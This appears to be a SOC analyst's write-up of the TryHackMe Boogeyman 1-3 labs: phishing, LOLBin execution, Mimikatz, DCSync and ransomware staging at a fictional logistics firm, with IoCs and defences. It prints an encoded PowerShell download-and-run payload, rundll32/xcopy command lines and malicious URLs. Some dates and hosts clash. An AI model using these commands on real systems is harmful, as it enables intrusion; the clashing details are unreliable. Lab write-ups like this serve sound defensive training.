# Incident Investigation Report – The Boogeyman Trilogy (Full Attack Chain Analysis)

**Incident Type:** Advanced Persistent Threat / Multi‑Stage Phishing Campaign  
**Status:** Completed  
**Date of Analysis:** 10 June 2026  

---

## Executive Summary

This report documents the complete investigation of three coordinated cyberattacks conducted by the threat actor known as **Boogeyman** against **Quick Logistics LLC**. The attacks, simulated as capstone challenges in the TryHackMe SOC Level 1 pathway, demonstrate a progression from initial compromise to domain‑wide ransomware staging.

**Boogeyman 1** (September 2021) targeted a finance employee via a phishing email with a malicious `.lnk` attachment, leading to PowerShell‑based enumeration and DNS data exfiltration. **Boogeyman 2** (October‑November 2023) returned with improved TTPs, compromising an HR employee through a malicious `.doc` attachment containing a VBA macro that downloaded stage‑2 payloads and established persistence. **Boogeyman 3** (August 2023) executed the most sophisticated attack, using an `.hta` file disguised as a PDF to implant a DLL, escalate privileges via UAC bypass, dump credentials with Mimikatz, move laterally, and stage ransomware.

All three incidents were successfully triaged, contained, and remediated. Findings were escalated per SOC L1 procedures.

---

## Investigation Workflow

The investigation of all three Boogeyman incidents followed a structured approach:

1. **Email Analysis** – inspect phishing emails, extract attachments, and identify sender/receiver details.
2. **Attachment Analysis** – analyse malicious files (`.lnk`, `.doc`, `.hta`) using specialised tools (`lnkparse`, `olevba`, `md5sum`).
3. **Payload Analysis** – decode and trace stage‑1 and stage‑2 payload execution.
4. **Memory Forensics** – analyse memory dumps with Volatility to identify processes, PIDs, and execution chains.
5. **Log Analysis** – examine PowerShell logs, Sysmon events, and Elastic/Kibana telemetry.
6. **Network Analysis** – identify C2 infrastructure, domains, and exfiltration channels.
7. **IoC Compilation** – extract indicators for blocking and hunting.
8. **MITRE ATT&CK Mapping** – classify adversary techniques.

---

## Boogeyman 1 – Finance Department Compromise

**Date:** September 2021  
**Victim:** Julianne Westcott (Finance, Quick Logistics LLC)  
**Initial Vector:** Spear‑phishing email with malicious `.lnk` attachment

### 1. Email Analysis

The phishing email was sent to Julianne Westcott, a finance employee, regarding an unpaid invoice from business partner B Packaging Inc..

| Detail | Value |
|--------|-------|
| **Sender Email** | `agriffin@bpakcaging.xyz` |
| **Victim Email** | `julianne.westcott@hotmail.com` |
| **Mail Relay Service** | `elasticemail.com` (identified via DKIM‑Signature) |
| **Attachment** | `Invoice_20230103.lnk` (encrypted ZIP) |
| **ZIP Password** | `Invoice2023!` |

### 2. LNK File Analysis

Using the `lnkparse` tool, the malicious shortcut file was analysed:

| Detail | Value |
|--------|-------|
| **Encoded Payload (Command Line Arguments)** | `aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==` |

### 3. PowerShell Execution & Enumeration

Decoding the payload revealed PowerShell script block activity (Event ID 4104):

| Detail | Value |
|--------|-------|
| **File Hosting Domain** | `files.bpakcaging.xyz` |
| **C2 Domain** | `cdn.bpakcaging.xyz` |
| **Enumeration Tool** | Identified via `iex` (Invoke‑Expression) analysis |

The attacker used PowerShell to download enumeration tools, perform network reconnaissance, and exfiltrate data via DNS.

---

## Boogeyman 2 – Human Resources Compromise

**Date:** October‑November 2023  
**Victim:** Maxine Beck (HR, Quick Logistics LLC)  
**Initial Vector:** Spear‑phishing email with malicious `.doc` attachment containing VBA macro

### 1. Email Analysis

| Detail | Value |
|--------|-------|
| **Sender Email** | `westaylor23@outlook.com` |
| **Victim Email** | `maxine.beck@quicklogisticsorg.onmicrosoft.com` |
| **Attachment** | `Resume_WesleyTaylor.doc` |
| **MD5 Hash** | `52c4384a0b9e248b95804352ebec6c5b` |

### 2. VBA Macro Analysis (olevba)

The malicious Word document contained an `AutoOpen` macro that downloaded stage‑2 payloads:

| Detail | Value |
|--------|-------|
| **Stage 2 Payload URL** | `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png` |
| **Execution Process** | `wscript.exe` |
| **Stage 2 File Path** | `C:\ProgramData\update.js` |

### 3. Memory Forensics (Volatility)

Analysis of the memory dump (`WKSTN-2961.raw`) revealed the execution chain:

| Detail | Value |
|--------|-------|
| **PID of wscript.exe** | `4260` |
| **Parent PID** | `1124` |
| **Malicious Binary URL** | `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe` |

The `wscript.exe` process executed `update.exe`, which established C2 communication and created a scheduled task for persistence.

---

## Boogeyman 3 – CEO & Domain Controller Compromise

**Date:** August 29–30, 2023  
**Victim:** Evan Hutchinson (CEO, Quick Logistics LLC)  
**Initial Vector:** Spear‑phishing email with `.hta` file disguised as a PDF

### 1. Initial Access & Execution

| Detail | Value |
|--------|-------|
| **Malicious File** | `ProjectFinancialSummary_Q3.pdf.hta` (disguised as PDF) |
| **Execution Process** | `mshta.exe` (PID: `6392`) |

### 2. Payload Implant

| Detail | Value |
|--------|-------|
| **Command** | `"C:\Windows\System32\xcopy.exe" /s /i /e /h D:\review.dat C:\Users\EVAN~1.HUT\AppData\Local\Temp\review.dat` |

### 3. DLL Execution

| Detail | Value |
|--------|-------|
| **Command** | `"C:\Windows\System32\rundll32.exe" D:\review.dat,DllRegisterServer` |

### 4. Persistence

| Detail | Value |
|--------|-------|
| **Scheduled Task Name** | `Review` |
| **Trigger** | Daily at 06:00 |

### 5. C2 Communication

| Detail | Value |
|--------|-------|
| **C2 IP:Port** | `165.232.170.151:80` |

### 6. Privilege Escalation (UAC Bypass)

| Detail | Value |
|--------|-------|
| **UAC Bypass Tool** | `fodhelper.exe` |

### 7. Credential Dumping (Mimikatz)

| Detail | Value |
|--------|-------|
| **GitHub URL** | Used to download Mimikatz |
| **Dumped Credentials** | `itadmin` NTLM hash: `F84769D250EB95EB2D7D8B4A1C5613F2` |

### 8. Lateral Movement

| Detail | Value |
|--------|-------|
| **Target Host** | `WKSTN-1327` |
| **Protocol** | WinRM (`wsmprovhost.exe`) |
| **Dumped Credentials** | `administrator` NTLM hash: `00f80f2538dcb54e7adc715c0e7091ec` |

### 9. Domain Controller Compromise (DCSync)

| Detail | Value |
|--------|-------|
| **Attack** | DCSync via Mimikatz |
| **Dumped Account** | `backupda` |

### 10. Ransomware Staging

| Detail | Value |
|--------|-------|
| **Download URL** | `hxxp://ff.sillytechninja.io/ransomboogey.exe` |
| **Ransomware File** | `ransomboogey.exe` |

---

## Correlation & Timeline

| Date | Incident | Key Events |
|------|----------|------------|
| September 2021 | Boogeyman 1 | Phishing email → `.lnk` attachment → PowerShell enumeration → DNS exfiltration |
| October‑November 2023 | Boogeyman 2 | Phishing email → `.doc` with VBA macro → `update.js` → `update.exe` → Persistence |
| August 29‑30, 2023 | Boogeyman 3 | Phishing email → `.hta` → `mshta.exe` → `review.dat` DLL → `rundll32` → Persistence → UAC bypass → Mimikatz → Lateral Movement → DCSync → Ransomware staging |

---

## Indicators of Compromise (IoC)

### Boogeyman 1

| Type | Value |
|------|-------|
| **Sender Email** | `agriffin@bpakcaging.xyz` |
| **Victim Email** | `julianne.westcott@hotmail.com` |
| **Mail Relay** | `elasticemail.com` |
| **Attachment** | `Invoice_20230103.lnk` |
| **File Hosting** | `files.bpakcaging.xyz` |
| **C2 Domain** | `cdn.bpakcaging.xyz` |

### Boogeyman 2

| Type | Value |
|------|-------|
| **Sender Email** | `westaylor23@outlook.com` |
| **Victim Email** | `maxine.beck@quicklogisticsorg.onmicrosoft.com` |
| **Attachment** | `Resume_WesleyTaylor.doc` |
| **MD5 Hash** | `52c4384a0b9e248b95804352ebec6c5b` |
| **Stage 2 URL** | `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png` |
| **Malicious Binary URL** | `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe` |
| **Stage 2 Path** | `C:\ProgramData\update.js` |

### Boogeyman 3

| Type | Value |
|------|-------|
| **Malicious File** | `ProjectFinancialSummary_Q3.pdf.hta` |
| **Payload** | `D:\review.dat` (DLL) |
| **C2 IP:Port** | `165.232.170.151:80` |
| **Scheduled Task** | `Review` |
| **UAC Bypass** | `fodhelper.exe` |
| **NTLM Hash (itadmin)** | `F84769D250EB95EB2D7D8B4A1C5613F2` |
| **NTLM Hash (administrator)** | `00f80f2538dcb54e7adc715c0e7091ec` |
| **Ransomware URL** | `hxxp://ff.sillytechninja.io/ransomboogey.exe` |

---

## MITRE ATT&CK Mapping

| Technique | Tactic | ID | Evidence |
|-----------|--------|----|----------|
| Spearphishing Attachment | Initial Access | T1566.001 | All three incidents |
| Malicious File (User Execution) | Execution | T1204.002 | `.hta` disguised as PDF |
| Command and Scripting Interpreter (PowerShell) | Execution | T1059.001 | Boogeyman 1 & 3 |
| VBScript (wscript.exe) | Execution | T1059.005 | Boogeyman 2 |
| Signed Binary Proxy Execution (Rundll32) | Execution | T1218.011 | Boogeyman 3 |
| Scheduled Task | Persistence | T1053.005 | Boogeyman 2 & 3 |
| UAC Bypass (fodhelper.exe) | Privilege Escalation | T1548.002 | Boogeyman 3 |
| OS Credential Dumping (LSASS) | Credential Access | T1003.001 | Boogeyman 3 |
| DCSync | Credential Access | T1003.006 | Boogeyman 3 |
| Remote Services (WinRM) | Lateral Movement | T1021.006 | Boogeyman 3 |
| Application Layer Protocol (HTTP) | C2 | T1071.001 | All three incidents |
| Data Encrypted for Impact (Ransomware) | Impact | T1486 | Boogeyman 3 |

---

## Conclusion & Recommendations

**Conclusion:**  
The Boogeyman threat actor demonstrated a clear escalation in sophistication across three distinct attack waves:

1. **Boogeyman 1 (2021):** Basic phishing with `.lnk` attachment leading to PowerShell‑based enumeration and DNS exfiltration. The attack was relatively contained but established the actor's interest in the logistics sector.

2. **Boogeyman 2 (2023):** More advanced TTPs including VBA macros, multi‑stage payload delivery, and scheduled task persistence. The attack successfully compromised an HR workstation and established C2 communication.

3. **Boogeyman 3 (2023):** Full‑scale compromise involving `.hta`‑based initial access, DLL injection, UAC bypass, credential dumping with Mimikatz, lateral movement via WinRM, DCSync attack on the Domain Controller, and ransomware staging.

The threat actor successfully evaded detection through living‑off‑the‑land techniques, obfuscation, and leveraging trusted system binaries.

### Immediate Actions (L1)

1. **Isolate** all affected hosts (`WKSTN-2961`, `WKSTN-0051`, `WKSTN-1327`, Domain Controller).
2. **Block** all malicious domains and IPs at perimeter firewall and DNS level:
   - `bpakcaging.xyz`, `boogeymanisback.lol`
   - `165.232.170.151`
   - `ff.sillytechninja.io`
3. **Reset passwords** for all compromised accounts (`julianne.westcott`, `maxine.beck`, `evan.hutchinson`, `itadmin`, `administrator`).
4. **Remove** all malicious scheduled tasks (especially `Review`).
5. **Delete** all malicious files (`Invoice_20230103.lnk`, `Resume_WesleyTaylor.doc`, `update.js`, `update.exe`, `review.dat`, `ProjectFinancialSummary_Q3.pdf.hta`).
6. **Review and revoke** any suspicious privileged access.

### Long‑term Recommendations

1. **Implement email filtering** to block encrypted ZIP attachments and macros in Office documents.
2. **Enable Script Block Logging** (PowerShell) and **Sysmon** across all endpoints.
3. **Create SIEM alerts** for:
   - Suspicious `mshta.exe` execution (`.hta` files)
   - `rundll32.exe` executing from Temp directories
   - `fodhelper.exe` (UAC bypass indicator)
   - `wscript.exe` executing JavaScript from `ProgramData`
   - DCSync events (Event ID 4662)
4. **Harden UAC** and implement application whitelisting.
5. **Conduct regular phishing simulations** and user awareness training.
6. **Implement LAPS** (Local Administrator Password Solution) to reduce credential reuse risk.

### Lessons Learned

1. **Phishing remains the primary vector** – all three attacks began with email. Advanced filtering and user training are critical.
2. **LOLBins are difficult to detect** – attackers abused `certutil`, `wscript`, `mshta`, `xcopy`, `rundll32`, and `fodhelper` – all legitimate Windows binaries.
3. **Multi‑stage payloads** require correlation across multiple log sources (email, process creation, network, memory).
4. **Memory forensics (Volatility)** is essential for identifying process execution chains.
5. **Elastic/Kibana** provides powerful visualisation for complex attack chains when properly configured.
6. **Credential dumping** (Mimikatz) and **DCSync** are high‑impact techniques requiring immediate escalation.

---

## References

- TryHackMe SOC Level 1 Pathway – Boogeyman 1, 2, 3
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [Volatility 3 Documentation](https://volatility3.readthedocs.io/)
- [Oletools (olevba)](https://github.com/decalage2/oletools)

---

*End of Report*